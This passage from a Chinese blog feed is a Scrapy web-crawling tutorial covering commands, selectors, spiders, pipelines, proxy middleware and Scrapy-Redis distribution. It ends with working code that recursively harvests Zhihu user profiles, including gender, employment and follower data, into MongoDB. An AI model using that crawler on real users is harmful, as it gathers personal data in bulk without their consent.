到本地的页面文件，而不是直接去访问网站</p></blockquote><h3 id="6-shell-进入命令行交互模式方便调试"><a href="#6-shell-进入命令行交互模式方便调试" class="headerlink" title="6.shell 进入命令行交互模式方便调试"></a><strong>6.shell 进入命令行交互模式方便调试</strong></h3><pre><code class="hljs">λ scrapy shell http://www.baidu.com</code></pre><h3 id="7-parse-格式化显示页面的解析结果"><a href="#7-parse-格式化显示页面的解析结果" class="headerlink" title="7.parse 格式化显示页面的解析结果"></a><strong>7.parse 格式化显示页面的解析结果</strong></h3><pre><code class="hljs">λ scrapy parse  http://quotes.toscrape.com -c parse</code></pre><h3 id="8-settings-获取配置信息"><a href="#8-settings-获取配置信息" class="headerlink" title="8.settings 获取配置信息"></a><strong>8.settings 获取配置信息</strong></h3><pre><code class="hljs">λ scrapy settings --get MONGO_URLlocalhost</code></pre><h3 id="9-runspider-运行爬虫文件启动项目"><a href="#9-runspider-运行爬虫文件启动项目" class="headerlink" title="9.runspider 运行爬虫文件启动项目"></a><strong>9.runspider 运行爬虫文件启动项目</strong></h3><p>当然运行前需要进入对应的文件目录</p><pre><code class="hljs">λ scrapy runspider quotes.py</code></pre><h3 id="10-查看对应的版本"><a href="#10-查看对应的版本" class="headerlink" title="10.查看对应的版本"></a><strong>10.查看对应的版本</strong></h3><pre><code class="hljs">λ  scrapy version -vScrapy       : 1.6.0lxml         : 4.3.3.0libxml2      : 2.9.5cssselect    : 1.0.3parsel       : 1.5.1w3lib        : 1.20.0Twisted      : 19.2.0Python       : 3.7.2 (tags/v3.7.2:9a3ffc0492, Dec 23 2018, 23:09:28) [MSC v.1916 64 bit (AMD64)]pyOpenSSL    : 19.0.0 (OpenSSL 1.1.1b  26 Feb 2019)cryptography : 2.6.1Platform     : Windows-10-10.0.17763-SP0</code></pre><h2 id="0X03-scrapy-中选择器的用法"><a href="#0X03-scrapy-中选择器的用法" class="headerlink" title="0X03 scrapy 中选择器的用法"></a><strong>0X03 scrapy 中选择器的用法</strong></h2><p>我们使用官方文档提供的实例网站来进行测试，网站的源码如下：</p><pre><code class="hljs">&lt;html&gt; &lt;head&gt;  &lt;base href=&#39;http://example.com/&#39; /&gt;  &lt;title&gt;Example website&lt;/title&gt; &lt;/head&gt; &lt;body&gt;  &lt;div id=&#39;images&#39;&gt;   &lt;a href=&#39;image1.html&#39;&gt;Name: My image 1 &lt;br /&gt;&lt;img src=&#39;image1_thumb.jpg&#39; /&gt;&lt;/a&gt;   &lt;a href=&#39;image2.html&#39;&gt;Name: My image 2 &lt;br /&gt;&lt;img src=&#39;image2_thumb.jpg&#39; /&gt;&lt;/a&gt;   &lt;a href=&#39;image3.html&#39;&gt;Name: My image 3 &lt;br /&gt;&lt;img src=&#39;image3_thumb.jpg&#39; /&gt;&lt;/a&gt;   &lt;a href=&#39;image4.html&#39;&gt;Name: My image 4 &lt;br /&gt;&lt;img src=&#39;image4_thumb.jpg&#39; /&gt;&lt;/a&gt;   &lt;a href=&#39;image5.html&#39;&gt;Name: My image 5 &lt;br /&gt;&lt;img src=&#39;image5_thumb.jpg&#39; /&gt;&lt;/a&gt;  &lt;/div&gt; &lt;/body&gt;&lt;/html&gt;</code></pre><p>运行下面代码进入交互模式</p><pre><code class="hljs">scrapy shell https://docs.scrapy.org/en/latest/_static/selectors-sample1.html</code></pre><p>scrapy 为我们提供了一个内置的选择器类 Selector ，我们可以通过 response.selector 来进行使用</p><h3 id="1-xpath-选择器"><a href="#1-xpath-选择器" class="headerlink" title="1.xpath 选择器"></a><strong>1.xpath 选择器</strong></h3><h4 id="1-xpath-选择器提取文本内容"><a href="#1-xpath-选择器提取文本内容" class="headerlink" title="(1)xpath 选择器提取文本内容"></a><strong>(1)xpath 选择器提取文本内容</strong></h4><p>简单看一下 xptah 的通用语法</p><pre><code class="hljs">nodename选取此节点的所有子节点。/从根节点选取。//从匹配选择的当前节点选择文档中的节点，而不考虑它们的位置。@选取属性。.选取当前节点。..选取当前节点的父节点。*匹配任何元素节点。@*匹配任何属性节点。/bookstore/book[1]选取属于 bookstore 子元素的第一个 book 元素。/bookstore/book[last()]选取属于 bookstore 子元素的最后一个 book 元素。/bookstore/book[last()-1]选取属于 bookstore 子元素的倒数第二个 book 元素。/bookstore/book[position()&lt;3]选取最前面的两个属于 bookstore 元素的子元素的 book 元素。//title[@lang]选取所有拥有名为 lang 的属性的 title 元素。//title[@lang=&#39;eng&#39;]选取所有 title 元素，且这些元素拥有值为 eng 的 lang 属性。/bookstore/book[price&gt;35.00]选取 bookstore 元素的所有 book 元素，且其中的 price 元素的值须大于 35.00。/bookstore/book[price&gt;35.00]/title选取 bookstore 元素中的 book 元素的所有 title 元素，且其中的 price 元素的值须大于 35.00。</code></pre><p>提取 title 的内容</p><pre><code class="hljs">In [2]: response.selector.xpath(&#39;/html/head/title&#39;).extract_first(   ...: )Out[2]: &#39;&lt;title&gt;Example website&lt;/title&gt;&#39;In [3]: response.selector.xpath(&#39;/html/head/title/text()&#39;).extract   ...: _first()Out[3]: &#39;Example website&#39;</code></pre><blockquote><p><strong>注意：</strong></p><p>我们还可以将上面的命令简写成 response.xpath()</p></blockquote><h4 id="（2）xpath-选择器提取属性内容"><a href="#（2）xpath-选择器提取属性内容" class="headerlink" title="（2）xpath 选择器提取属性内容"></a><strong>（2）xpath 选择器提取属性内容</strong></h4><p>我们可以使用 xpath 提取 a 标签的属性 href</p><pre><code class="hljs">In [16]: response.xpath(&#39;//a/@href&#39;).extract()Out[16]: [&#39;image1.html&#39;, &#39;image2.html&#39;, &#39;image3.html&#39;, &#39;image4.html&#39;, &#39;image5.html&#39;]</code></pre><h3 id="2-css-选择器"><a href="#2-css-选择器" class="headerlink" title="2.css 选择器"></a><strong>2.css 选择器</strong></h3><h4 id="1-css-选择器提取文本内容"><a href="#1-css-选择器提取文本内容" class="headerlink" title="(1)css 选择器提取文本内容"></a><strong>(1)css 选择器提取文本内容</strong></h4><p>提取 title 的内容</p><pre><code class="hljs">In [5]: response.selector.css(&#39;head &gt; title::text&#39;)                Out[5]: [&lt;Selector xpath=&#39;descendant-or-self::head/title/text()&#39; data=&#39;Example website&#39;&gt;]                                                                                                                In [6]: response.selector.css(&#39;head &gt; title::text&#39;).extract_first(    ...: )                                                          Out[6]: &#39;Example website&#39;       </code></pre><blockquote><p><strong>注意：</strong></p><p>我们还可以将上面的命令简写成 response.css()</p></blockquote><h4 id="2-css-选择器提取属性内容"><a href="#2-css-选择器提取属性内容" class="headerlink" title="(2)css 选择器提取属性内容"></a><strong>(2)css 选择器提取属性内容</strong></h4><p>也可以使用 css 提取 a 标签的属性 href</p><pre><code class="hljs">In [17]: response.css(&#39;a::attr(href)&#39;).extract()Out[17]: [&#39;image1.html&#39;, &#39;image2.html&#39;, &#39;image3.html&#39;, &#39;image4.html&#39;, &#39;image5.html&#39;]</code></pre><h3 id="3-re-正则"><a href="#3-re-正则" class="headerlink" title="3.re 正则"></a><strong>3.re 正则</strong></h3><p>我们想匹配冒号后面的内容</p><pre><code class="hljs">In [19]: response.css(&#39;a::text&#39;).re(&#39;Name\\:(.*)&#39;)Out[19]:[&#39; My image 1 &#39;, &#39; My image 2 &#39;, &#39; My image 3 &#39;, &#39; My image 4 &#39;, &#39; My image 5 &#39;]</code></pre><h3 id="4-综合使用"><a href="#4-综合使用" class="headerlink" title="4.综合使用"></a><strong>4.综合使用</strong></h3><pre><code class="hljs">In [10]:  response.xpath(&#39;//*[@id=&quot;images&quot;]&#39;).css(&#39;img::attr(src)&#39;    ...: ).extract()Out[10]:[&#39;image1_thumb.jpg&#39;, &#39;image2_thumb.jpg&#39;, &#39;image3_thumb.jpg&#39;, &#39;image4_thumb.jpg&#39;, &#39;image5_thumb.jpg&#39;]</code></pre><p>如果是使用 extract_frist() 的话，我们可以设置 default 属性，这样查找不存在的结果的时候就可以使用我们设置的 defalut 来输出</p><pre><code class="hljs">In [12]:  response.xpath(&#39;//*[@id=&quot;images&quot;]&#39;).css(&#39;img::attr(srcc)    ...: &#39;).extract_first(default=&#39;error&#39;)Out[12]: &#39;error&#39;In [20]: response.css(&#39;a::text&#39;).re_first(&#39;Name\:(.*)&#39;)Out[20]: &#39; My image 1 &#39;</code></pre><h2 id="0X04-scrapy-中-spiders-的用法"><a href="#0X04-scrapy-中-spiders-的用法" class="headerlink" title="0X04 scrapy 中 spiders 的用法"></a><strong>0X04 scrapy 中 spiders 的用法</strong></h2><h3 id="1-spider-的三个属性"><a href="#1-spider-的三个属性" class="headerlink" title="1.spider 的三个属性"></a><strong>1.spider 的三个属性</strong></h3><p>为了创建一个Spider，必须继承 scrapy.Spider 类， 且定义以下两个属性和一个方法:</p><h4 id="1-属性"><a href="#1-属性" class="headerlink" title="(1)属性"></a><strong>(1)属性</strong></h4><p>1.name: 用于区别Spider。 该名字必须是唯一的，您不可以为不同的Spider设定相同的名字。<br>2.allowed_domains：包含允许此爬虫访问的域的可选列表<br>3.start_urls: 包含了Spider在启动时进行爬取的url列表。 因此，第一个被获取到的页面将是其中之一。 后续的URL则从初始的URL获取到的数据中提取。</p><h4 id="2-方法"><a href="#2-方法" class="headerlink" title="(2)方法"></a><strong>(2)方法</strong></h4><p>parse() 是spider的一个默认方法。 </p><p>被调用时，每个初始URL完成下载后生成的 Response 对象将会作为唯一的参数传递给该函数。 该方法负责解析返回的数据(response data)，提取数据(生成item)以及生成需要进一步处理的URL的 Request 对象。</p><p><strong>实例代码：</strong></p><pre><code class="hljs">import scrapyclass DmozSpider(scrapy.Spider):    name = &quot;dmoz&quot;    allowed_domains = [&quot;dmoz.org&quot;]    start_urls = [        &quot;http://www.dmoz.org/Computers/Programming/Languages/Python/Books/&quot;,        &quot;http://www.dmoz.org/Computers/Programming/Languages/Python/Resources/&quot;    ]    def parse(self, response):        filename = response.url.split(&quot;/&quot;)[-2]        with open(filename, &#39;wb&#39;) as f:            f.write(response.body)</code></pre><h3 id="1-重写-parse-方法实现自定义的输出结果"><a href="#1-重写-parse-方法实现自定义的输出结果" class="headerlink" title="1.重写 parse 方法实现自定义的输出结果"></a><strong>1.重写 parse 方法实现自定义的输出结果</strong></h3><pre><code class="hljs">def parse(self, response):    quotes = response.css(&#39;.quote&#39;)    for quote in quotes:        #定义接收对象item        item = QuotetutorialItem()        text = quote.css(&#39;.text::text&#39;).extract_first()        author = quote.css(&#39;.author::text&#39;).extract_first()        tags = quote.css(&#39;.tags .tag::text&#39;).extract()        item[&#39;text&#39;] = text        item[&#39;author&#39;] = author        item[&#39;tags&#39;] = tags        yield item    next = response.css(&#39;.pager .next a::attr(href)&#39;).extract_first()    #拼接下一页的 URL    url = response.urljoin(next)    #使用 scrapy.Request 递归的调用自己实现爬取下一页    yield scrapy.Request(url=url,callback=self.parse)</code></pre><p>可以返回两种类型的结果，一种就是 item ,另一种就是 request 对象实现进一步</p><h3 id="2-重写-start-requests-方法实现-post-请求"><a href="#2-重写-start-requests-方法实现-post-请求" class="headerlink" title="2.重写 start_requests 方法实现 post 请求"></a><strong>2.重写 start_requests 方法实现 post 请求</strong></h3><pre><code class="hljs">class HttpbinSpider(scrapy.Spider):    name = &#39;httpbin&#39;    allowed_domains = [&#39;www.httpbin.org&#39;]    start_urls = [&#39;http://www.httpbin.org/post&#39;]    #重写 start_requests 改变请求方式    def start_requests(self):        yield scrapy.Request(url=&#39;http://www.httpbin.org/post&#39;,method=&#39;POST&#39;,callback=self.parse_post)        #这里重写了默认的回调函数 parse     def parse_post(self,response):        print(&#39;hello&#39;,response.status)</code></pre><blockquote><p><strong>注意：</strong></p><p>这里还有一个方法是 start_requests() 默认调用的方法<br>make_requests_from_url()，如果我们直接重写这个方法的话，也能实现类似的效果</p></blockquote><h3 id="3-定义-category-实现运行时传入自定义函数"><a href="#3-定义-category-实现运行时传入自定义函数" class="headerlink" title="3.定义 category 实现运行时传入自定义函数"></a><strong>3.定义 category 实现运行时传入自定义函数</strong></h3><pre><code class="hljs">class HttpbinSpider(scrapy.Spider):    name = &#39;httpbin&#39;    allowed_domains = [&#39;www.httpbin.org&#39;]    start_urls = [&#39;http://www.httpbin.org/post&#39;]    def __init__(self,category=None):        self.category = category    def start_requests(self):        yield scrapy.Request(url=&#39;http://www.httpbin.org/post&#39;,method=&#39;POST&#39;,callback=self.parse_post)    def parse_post(self,response):        print(&#39;hello&#39;,response.status,self.category)</code></pre><p>运行时使用 -a 参数动态传入 category</p><pre><code class="hljs">scrapy crawl httpbin -a category=picture</code></pre><blockquote><p><strong>注意：</strong></p><p>如果是传入多个参数的话每个参数前需要加 -a</p></blockquote><h2 id="0X05-scrapy-中-item-pipeline-的用法"><a href="#0X05-scrapy-中-item-pipeline-的用法" class="headerlink" title="0X05 scrapy 中 item pipeline 的用法"></a><strong>0X05 scrapy 中 item pipeline 的用法</strong></h2><p>item pipeline 顾名思义就是项目管道，我们在抓取到 item 以后需要对其进行进一步处理，比如数据的清洗、重复检查、数据库存储等</p><h3 id="0-使用的时候需要在-settings-中设置我们配置的-pipeline"><a href="#0-使用的时候需要在-settings-中设置我们配置的-pipeline" class="headerlink" title="0.使用的时候需要在 settings 中设置我们配置的 pipeline"></a><strong>0.使用的时候需要在 settings 中设置我们配置的 pipeline</strong></h3><pre><code class="hljs">ITEM_PIPELINES = &#123;   &#39;quotetutorial.pipelines.QuotetutorialPipeline&#39;: 300,&#39;quotetutorial.pipelines.MongoPipeline&#39;: 400,&#125;</code></pre><h3 id="1-重写-process-item-实现-item-处理"><a href="#1-重写-process-item-实现-item-处理" class="headerlink" title="1.重写 process_item 实现 item 处理"></a><strong>1.重写 process_item 实现 item 处理</strong></h3><p>最主要是重写 process_item 方法，这个方法是对 Item 进行处理的</p><pre><code class="hljs">class QuotetutorialPipeline(object):    def __init__(self):        self.limit = 50    def process_item(self, item, spider):        if item[&#39;text&#39;]:            if len(item[&#39;text&#39;]) &gt;  self.limit:                item[&#39;text&#39;] = item[&#39;text&#39;][:self.limit].rstrip() + &#39;...&#39;            return item        else:            # scrapy 特殊的错误处理函数            return DropItem(&#39;Missing Text&#39;)        </code></pre><p>返回值是 Item 或者是 DropItem </p><h3 id="2-实现-open-spider-和-close-spider-方法"><a href="#2-实现-open-spider-和-close-spider-方法" class="headerlink" title="2.实现 open_spider 和 close_spider 方法"></a><strong>2.实现 open_spider 和 close_spider 方法</strong></h3><p>这两个是初始化爬虫和关闭爬虫的时候会调用的方法,比如我们可以打开和关闭文件</p><pre><code class="hljs">import jsonclass JsonWriterPipeline(object):    def open_spider(self, spider):        self.file = open(&#39;items.jl&#39;, &#39;w&#39;)    def close_spider(self, spider):        self.file.close()    def process_item(self, item, spider):        line = json.dumps(dict(item)) + &quot;\n&quot;        self.file.write(line)        return item</code></pre><h3 id="3-重写-from-crawler-实现读取配置文件中的配置"><a href="#3-重写-from-crawler-实现读取配置文件中的配置" class="headerlink" title="3.重写 from_crawler 实现读取配置文件中的配置"></a><strong>3.重写 from_crawler 实现读取配置文件中的配置</strong></h3><pre><code class="hljs">class MongoPipeline(object):    def __init__(self,mongo_url,mongo_db):        self.mongo_url = mongo_url        self.mongo_db = mongo_db    #这个内置函数能从 settings 里面拿到想要的配置信息    @classmethod    def from_crawler(cls,crawler):        return cls(            mongo_url = crawler.settings.get(&#39;MONGO_URL&#39;),            mongo_db = crawler.settings.get(&#39;MONGO_DB&#39;)        )    #这个方法是爬虫初始化的时候会执行的方法    def open_spider(self,spider):        self.client = pymongo.MongoClient(self.mongo_url)        self.db = self.client[self.mongo_db]    #重写该方法实现对数据的数据库存储    def process_item(self,item,spider):        name = item.__class__.__name__        self.db[name].insert(dict(item))        return item    def close_spider(self,spider):        self.client.close()</code></pre><h2 id="0X06-scrapy-中-Download-MiddleWare-下载中间件-的使用"><a href="#0X06-scrapy-中-Download-MiddleWare-下载中间件-的使用" class="headerlink" title="0X06 scrapy 中 Download MiddleWare(下载中间件) 的使用"></a><strong>0X06 scrapy 中 Download MiddleWare(下载中间件) 的使用</strong></h2><h3 id="1-基本介绍"><a href="#1-基本介绍" class="headerlink" title="1.基本介绍"></a><strong>1.基本介绍</strong></h3><p>先来看一下下载中间件在全局架构中的位置：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%20%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E7%AF%8714.png" alt="此处输入图片的描述"></p><p>可以明显的看到其在 request 和 response 的过程中起到了一个拦截和修改的作用，但是其实它有三个方法</p><p>(1)处理请求：process_request(request, spider)<br>(2)处理响应：process_response(request, response, spider)<br>(3)处理异常：process_exception(request, exception, spider)</p><h3 id="2-拦截-request-并修改"><a href="#2-拦截-request-并修改" class="headerlink" title="2.拦截 request 并修改"></a><strong>2.拦截 request 并修改</strong></h3><p>我们访问 httpbin.org 可以查看到我们的访问的 IP , 我们可以使用 下载中间件拦截我们的请求实现 IP 地址的伪造</p><p><strong>middlewares.py</strong></p><pre><code class="hljs">class ProxyMiddleware(object):    logger = logging.getLogger(__name__)    def process_request(self,request,spider):        self.logger.debug(&#39;Using proxy&#39;)        request.meta[&#39;proxy&#39;] = &#39;http://127.0.0.1:1080&#39;</code></pre><p>然后我们在 settings 中进行设置</p><p><strong>settings.py</strong>    </p><pre><code class="hljs">DOWNLOADER_MIDDLEWARES = &#123;   &#39;quotetutorial.middlewares.ProxyMiddleware&#39;: 443,&#125;</code></pre><h3 id="3-拦截-response-并修改"><a href="#3-拦截-response-并修改" class="headerlink" title="3.拦截 response 并修改"></a><strong>3.拦截 response 并修改</strong></h3><pre><code class="hljs">class ProxyMiddleware(object):    logger = logging.getLogger(__name__)    def process_request(self,request,spider):        self.logger.debug(&#39;Using proxy&#39;)        request.meta[&#39;proxy&#39;] = &#39;http://127.0.0.1:1080&#39;    def process_response(self,spider,request,response):        response.status = 204        return response</code></pre><h3 id="4-拦截异常并处理"><a href="#4-拦截异常并处理" class="headerlink" title="4.拦截异常并处理"></a><strong>4.拦截异常并处理</strong></h3><p><strong>google.py</strong> </p><pre><code class="hljs">class GoogleSpider(scrapy.Spider):    name = &#39;google&#39;    allowed_domains = [&#39;www.google.com&#39;]    start_urls = [&#39;http://www.google.com/&#39;]    #设置请求的超时时间为 10s ,超时会抛出异常    def make_requests_from_url(self, url):        self.logger.debug(&#39;Try First Time&#39;)        return scrapy.Request(url=url,meta=&#123;&#39;download_timeout&#39;:10&#125;,callback=self.parse,dont_filter=True)    def parse(self, response):        print(response.text)</code></pre><p><strong>middlewares.py</strong></p><pre><code class="hljs">class ProxyMiddleware(object):    logger = logging.getLogger(__name__)    def process_exception(self,request,exception,spider):        self.logger.debug(&#39;Get Exception&#39;)        self.logger.debug(&#39;Try Second Time&#39;)        request.meta[&#39;proxy&#39;] = &#39;http://127.0.0.1:1080&#39;        return request</code></pre><h3 id="5-其他"><a href="#5-其他" class="headerlink" title="5.其他"></a><strong>5.其他</strong></h3><p>运行代码的时候你可能会发现，在调试信息中会出现很多我们没有定义过得 Middleware ，这实际上是系统自己设置的，我们可以通过下面的命令获取这些内置的middleware </p><pre><code class="hljs">scrapy settings --get=DOWNLOADER_MIDDLEWARES_BASE  </code></pre><p>如果我们不想使用这些 middleware 我们可以在 settings 中将其置位 None</p><pre><code class="hljs">λ scrapy settings --get=DOWNLOADER_MIDDLEWARES_BASE&#123;&quot;scrapy.downloadermiddlewares.robotstxt.RobotsTxtMiddleware&quot;: 100, &quot;scrapy.downloadermiddlewares.httpauth.HttpAuthMiddleware&quot;: 300, &quot;scrapy.downloadermiddlewares.downloadtimeout.DownloadTimeoutMiddleware&quot;: 350, &quot;scrapy.downloadermiddlewares.defaultheaders.DefaultHeadersMiddleware&quot;: 400, &quot;scrapy.downloadermiddlewares.useragent.UserAgentMiddleware&quot;: 500, &quot;scrapy.downloadermiddlewares.retry.RetryMiddleware&quot;: 550, &quot;scrapy.downloadermiddlewares.ajaxcrawl.AjaxCrawlMiddleware&quot;: 560, &quot;scrapy.downloadermiddlewares.redirect.MetaRefreshMiddleware&quot;: 580, &quot;scrapy.downloadermiddlewares.httpcompression.HttpCompressionMiddleware&quot;: 590, &quot;scrapy.downloadermiddlewares.redirect.RedirectMiddleware&quot;: 600, &quot;scrapy.downloadermiddlewares.cookies.CookiesMiddleware&quot;: 700, &quot;scrapy.downloadermiddlewares.httpproxy.HttpProxyMiddleware&quot;: 750, &quot;scrapy.downloadermiddlewares.stats.DownloaderStats&quot;: 850, &quot;scrapy.downloadermiddlewares.httpcache.HttpCacheMiddleware&quot;: 900&#125;</code></pre><h2 id="0X07-Scrapy爬取知乎用户信息实战"><a href="#0X07-Scrapy爬取知乎用户信息实战" class="headerlink" title="0X07 Scrapy爬取知乎用户信息实战"></a><strong>0X07 Scrapy爬取知乎用户信息实战</strong></h2><h3 id="1-分析爬取信息确定思路"><a href="#1-分析爬取信息确定思路" class="headerlink" title="1.分析爬取信息确定思路"></a><strong>1.分析爬取信息确定思路</strong></h3><p>只要用户不是 0关注0粉丝，那么我们就能对与用户关联的人进行递归抓取，这样就能获得源源不断的信息，以轮子哥的知乎为例，我们从控制台看一下他关注的人的信息是怎么加载的，除了第一页是通过在页面中的 json 数据进行的初始化以外，其他几页可以看到是通过 XHR 请求获取的 json 数据，然后是对于每一个用户来讲信息来自于用户信息页面本身的 json 数据</p><p><strong>思路梳理：</strong></p><p>(1)选定一个关注数或者粉丝数比较多的大 V 作为我们爬取的起点<br>(2)通过知乎的接口获取大 V 的关注列表和粉丝列表<br>(3)通过知乎的接口获取关注列表和粉丝列表中用户的信息<br>(4)对这些用户递归调用爬取其关注列表和粉丝列表</p><h3 id="2-代码实现"><a href="#2-代码实现" class="headerlink" title="2.代码实现"></a><strong>2.代码实现</strong></h3><p><strong>zhihu.py</strong></p><pre><code class="hljs">class ZhihuSpider(scrapy.Spider):    name = &#39;zhihu&#39;    allowed_domains = [&#39;www.zhihu.com&#39;]    start_urls = [&#39;http://www.zhihu.com/&#39;]    #设置开始用户    start_user = &#39;Talyer-Wei&#39;    #设置查看用户信息的 URL    user_url = &#39;https://www.zhihu.com/api/v4/members/&#123;user&#125;?include=&#123;include&#125;&#39;    user_query = &#39;allow_message,is_followed,is_following,is_org,is_blocking,employments,answer_count,follower_count,articles_count,gender,badge[?(type=best_answerer)].topics&#39;    #设置查看关注着信息的 URL    followee_url = &#39;https://www.zhihu.com/api/v4/members/&#123;user&#125;/followees?include=&#123;include&#125;&amp;offset=&#123;offset&#125;&amp;limit=&#123;limit&#125;&#39;    followee_query = &#39;data[*].answer_count,articles_count,gender,follower_count,is_followed,is_following,badge[?(type=best_answerer)].topics&#39;    def start_requests(self):        #url = &#39;https://www.zhihu.com/api/v4/members/xu-zhou-yang-52?include=allow_message%2Cis_followed%2Cis_following%2Cis_org%2Cis_blocking%2Cemployments%2Canswer_count%2Cfollower_count%2Carticles_count%2Cgender%2Cbadge%5B%3F(type%3Dbest_answerer)%5D.topics&#39;        #url = &#39;https://www.zhihu.com/api/v4/members/Talyer-Wei/followees?include=data%5B*%5D.answer_count%2Carticles_count%2Cgender%2Cfollower_count%2Cis_followed%2Cis_following%2Cbadge%5B%3F(type%3Dbest_answerer)%5D.topics&amp;offset=0&amp;limit=20&#39;        #分别请求初始用户的信息和他关注的用户列表        yield Request(self.user_url.format(user=self.start_user,include=self.user_query),self.parse_user)        yield Request(self.followee_url.format(user=self.start_user,include=self.followee_query,offset=0,limit=20),self.parse_followee)    def parse_user(self, response):        #用请求得到的 json 给我们的 field 赋值        result = json.loads(response.text)        item = UserItem()        for field in item.fields:            if field in result.keys():                item[field] = result.get(field)        yield item        yield Request(self.followee_url.format(user=result.get(&#39;url_token&#39;),include=self.followee_query,limit=20,offset=0),self.parse_followee)    def parse_followee(self,response):        #解析出每一个 followee 的用户 url_token        results = json.loads(response.text)        if &#39;data&#39; in results.keys():            for result in results.get(&#39;data&#39;):                yield Request(self.user_url.format(user=result.get(&#39;url_token&#39;),include=self.user_query),self.parse_user)        if &#39;paging&#39; in results.keys() and results.get(&#39;paging&#39;).get(&#39;is_end&#39;) == False:            next_page = results.get(&#39;paging&#39;).get(&#39;next&#39;)            yield Request(next_page,self.parse_followee)</code></pre><p><strong>item.py</strong></p><pre><code class="hljs">from scrapy import Item,Fieldclass UserItem(Item):    # define the fields for your item here like:    # name = scrapy.Field()    id = Field()    name = Field()    headline = Field()    url = Field()    url_token = Field()    answer_count = Field()    articles_count = Field()    avatar_url = Field()    follower_count = Field()</code></pre><p><strong>pipelines.py</strong></p><pre><code class="hljs">import pymongoclass MongoPipeline(object):    collection_name = &#39;scrapy_items&#39;    def __init__(self, mongo_uri, mongo_db):        self.mongo_uri = mongo_uri        self.mongo_db = mongo_db    @classmethod    def from_crawler(cls, crawler):        return cls(            mongo_uri=crawler.settings.get(&#39;MONGO_URI&#39;),            mongo_db=crawler.settings.get(&#39;MONGO_DATABASE&#39;)        )    def open_spider(self, spider):        self.client = pymongo.MongoClient(self.mongo_uri)        self.db = self.client[self.mongo_db]    def close_spider(self, spider):        self.client.close()    def process_item(self, item, spider):        #self.db[self.collection_name].insert_one(dict(item))        self.db[&#39;user&#39;].update(&#123;&#39;url_token&#39;:item[&#39;url_token&#39;]&#125;,&#123;&#39;$set&#39;:item&#125;,True )        return item</code></pre><blockquote><p><strong>注意：</strong></p><p>settings 中还要配置 UA  以及数据库的一些常量，这里就不在多写了</p></blockquote><h2 id="0X08-Scrapy分布式原理及Scrapy-Redis源码解析"><a href="#0X08-Scrapy分布式原理及Scrapy-Redis源码解析" class="headerlink" title="0X08 Scrapy分布式原理及Scrapy-Redis源码解析"></a><strong>0X08 Scrapy分布式原理及Scrapy-Redis源码解析</strong></h2><h3 id="1-单机-Scrapy-架构和分布式对比"><a href="#1-单机-Scrapy-架构和分布式对比" class="headerlink" title="1.单机 Scrapy 架构和分布式对比"></a><strong>1.单机 Scrapy 架构和分布式对比</strong></h3><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%20%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E7%AF%8714.png" alt="此处输入图片的描述"></p><p>具体的步骤是  scrapy 引擎通过调度器调度一个队列，发出 requests 请求给 downloader 然后请求网络，但是这个队列都是本机的队列，因此如果要做多台主机的协同的爬取的话，每台主机自己的队列是不能满足我们的需要的，那我们就要将这个队列做成统一的可访问的队列(<strong>共享爬取队列</strong>)，每次调用 requests 的时候都是统一调用这个队列，进行统一的存取操作</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%20%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E7%AF%8715.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/python3%20%E7%88%AC%E8%99%AB%E6%A1%86%E6%9E%B6%E7%AF%8716.png" alt="此处输入图片的描述"></p><h3 id="2-队列使用什么维护"><a href="#2-队列使用什么维护" class="headerlink" title="2.队列使用什么维护"></a><strong>2.队列使用什么维护</strong></h3><p>推荐使用 Redis 作为我们的维护队列,原因有一下三点</p><p>(1)非关系型数据库，key-value 存储结构灵活<br>(2)内存中的数据结构存储系统，性能好<br>(3)提供队列，集合等多种存储结构方便队列维护</p><h3 id="3-队列如何去重"><a href="#3-队列如何去重" class="headerlink" title="3.队列如何去重"></a><strong>3.队列如何去重</strong></h3><p>使用 redis 的集合数据结构，向集合中加入 requests 的指纹，每一个 requests 加入集合前先验证指纹存不存在集合中，如果存在则不进行加入</p><h3 id="4-架构的实现"><a href="#4-架构的实现" class="headerlink" title="4.架构的实现"></a><strong>4.架构的实现</strong></h3><p>实际上存在 Scrapy-Redis 这个库，这个库帮我们完美的实现了这个架构，包括调度器、队列、去重等一应俱全</p><p>**项目地址：**<a href="https://github.com/rmax/scrapy-redis">https://github.com/rmax/scrapy-redis</a></p><h3 id="5-实际的使用"><a href="#5-实际的使用" class="headerlink" title="5.实际的使用"></a><strong>5.实际的使用</strong></h3><p>我们可以将配置好的代码上传到我们的 git 仓库，然后每一台主机去克隆运行</p><p>在太多主机的情况下如果觉得这种方式不是很方便的话，github 还有一个 scrapyd 的项目，可以帮助我们部署</p>]]></content>
    
    
    <categories>
      
      <category>备忘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>爬虫</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Python3 爬虫知识梳理(实战篇)</title>
    <link href="/2019/05/07/python3%20%E7%88%AC%E8%99%AB%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86(%E5%AE%9E%E6%88%98%E7%AF%87)/"/>
    <url>/2019/05/07/python3%20%E7%88%AC%E8%99%AB%E7%9F%A5%E8%AF%86%E6%A2%B3%E7%90%86(%E5%AE%9E%E6%88%98%E7%AF%87)/</url>
    
